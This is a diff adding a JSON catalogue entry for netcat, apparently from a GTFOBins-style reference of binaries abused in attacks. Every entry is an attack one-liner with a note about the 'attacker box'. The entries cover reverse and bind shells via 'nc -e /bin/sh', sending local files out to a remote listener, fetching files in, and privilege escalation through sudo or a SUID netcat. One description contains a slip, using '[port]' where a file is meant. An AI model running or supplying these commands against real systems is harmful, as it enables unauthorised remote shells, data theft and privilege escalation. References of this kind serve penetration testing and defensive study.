@@ -1,0 +1,40 @@
+{
+  "functions": {
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell. This only works with netcat traditional.",
+        "code": "nc -e /bin/sh [host] [port]\n"
+      }
+    ],
+    "bind-shell": [
+      {
+        "description": "Run 'nc [host] [port]` on the attacker box to connect to the shell. This only works with netcat traditional.",
+        "code": "nc -l -p [port] -e /bin/sh\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send a local file via TCP. Run 'nc -l -p [port] > [file]' on the attacker box to collect the file.",
+        "code": "nc [host] [port] < [file]\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via TCP. Run 'nc [host] [port] < [port]' on the attacker box to send the file.",
+        "code": "nc -l -p [port] > [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell. This only works with netcat traditional.",
+        "code": "sudo nc -e /bin/sh [host] [port]\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell. This only works with netcat traditional.",
+        "code": "./nc -e /bin/sh [host] [port]\n"
+      }
+    ]
+  }
+}
